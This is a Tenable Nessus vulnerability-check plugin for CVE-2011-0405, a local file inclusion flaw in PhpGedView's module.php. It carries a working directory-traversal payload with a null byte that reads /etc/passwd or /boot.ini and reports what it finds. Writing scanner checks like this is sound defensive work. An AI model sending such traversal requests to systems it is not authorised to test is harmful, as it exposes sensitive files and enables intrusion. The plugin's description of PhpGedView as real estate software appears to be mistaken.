#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(51457);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/05/20 14:30:35 $");

  script_cve_id("CVE-2011-0405");
  script_bugtraq_id(45674);
  script_osvdb_id(70295);
  script_xref(name:"EDB-ID", value:"15913");

  script_name(english:"PhpGedView module.php pgvaction Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is prone to a local
file inclusion attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The web server hosts PhpGedView, a web-based real estate listing
management application written in PHP.

The version of PhpGedView installed on the remote host fails to
sanitize user input to the 'pgvaction' parameter of the 'module.php'
script before using it to include PHP code.

Regardless of PHP's 'register_globals' setting, an unauthenticated,
remote attacker can leverage this issue to view arbitrary files or
possibly execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id."
  );
   # http://sourceforge.net/projects/phpgedview/forums/forum/185166/topic/4040059
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7a26c629");
  script_set_attribute(
    attribute:"solution",
    value:
"Either remove or change permissions on the affected script or apply
the 'Improved hacking detection' (ID: 3152857) patch."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"PhpGedView 4.2.3 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpgedview:phpgedview");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("phpgedview_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP", "www/phpgedview");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_install_from_kb(appname:'phpgedview', port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

traversal = crap(data:"../", length:3*9) + '..';

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Get a list of modules to test.
mods = make_list();

url = dir + '/modules/';
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

pat = '<a href="([^"]+)/';
matches = egrep(pattern:pat, string:res[2]);
if (matches)
{
  foreach match (split(matches, keep:FALSE))
  {
    item = eregmatch(pattern:pat, string:match);
    if (!isnull(item)) mods = make_list(mods, item[1]);
  }
}

if (max_index(mods) == 0)
{
  mods = make_list(
    "FCKeditor",
    "GEDFact_assistant",
    "JWplayer",
    "batch_update",
    "cms_interface",
    "gallery2",
    "googlemap",
    "lightbox",
    "punbb",
    "research_assistant",
    "sitemap",
    "slideshow",
    "wordsearch"
  );
}


# Loop through files to look for.
foreach mod (mods)
{
  foreach file (files)
  {
    # Try to exploit the issue.
    if (file[0] == '/') traversal = mult_str(str:"../", nb:12) + '..';
    else traversal = '../../';

    url = dir + '/module.php?' +
      'mod=' + mod + '&' +
      'pgvaction=' + traversal + file + '%00';
    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

    body = res[2];
    file_pat = file_pats[file];

    # If the patch is applied, we'll see our value of 'pgvaction' replaced with 'index.php'.
    if (
      mod+"/index.php): failed to open stream: No such file" >< body ||
      mod+"/index.php) [function.require-once]: failed to open stream: No such file" >< body ||
      mod+"/index.php) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: No such file" >< body
    ) exit(0, "The PhpGedView install at "+build_url(port:port, qs:dir+'/')+" is not affected.");

    # There's a problem if we see the expected contents.
    if (egrep(pattern:file_pat, string:body))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        header =
          'Nessus was able to exploit the issue to retrieve the contents of\n' +
          "'" + file + "' on the remote host using the following URL";
        trailer = '';

        if (report_verbosity > 1)
        {
          trailer =
            'Here are its contents :\n' +
            '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
            body +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        }
        report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
exit(0, "The PhpGedView install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
